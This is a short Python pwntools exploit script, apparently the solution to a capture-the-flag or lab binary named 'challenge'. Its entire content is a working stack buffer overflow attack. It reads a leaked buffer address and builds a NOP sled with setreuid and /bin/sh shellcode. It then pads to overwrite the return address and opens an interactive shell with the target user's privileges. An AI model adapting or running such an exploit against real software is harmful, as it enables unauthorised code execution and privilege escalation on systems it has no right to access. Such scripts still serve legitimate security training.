from pwn import *

context.update(arch='amd64', os='linux')

p = process("./challenge")
p.recvuntil(b"buffer: ")

buffer_address = p64(int(p.recvline(), 16) + 10)

p.recvline()
p.recvline()

buffer_len = 250
before_ret = 22
payload = b'\x90' * 20 + asm(shellcraft.setreuid(uid=4243) + shellcraft.sh())
payload =  payload + b'\x90' * (buffer_len + before_ret - len(payload)) + buffer_address

with open("input", "wb") as fout:
    fout.write(payload)

p.send(payload)

p.interactive()

p.close()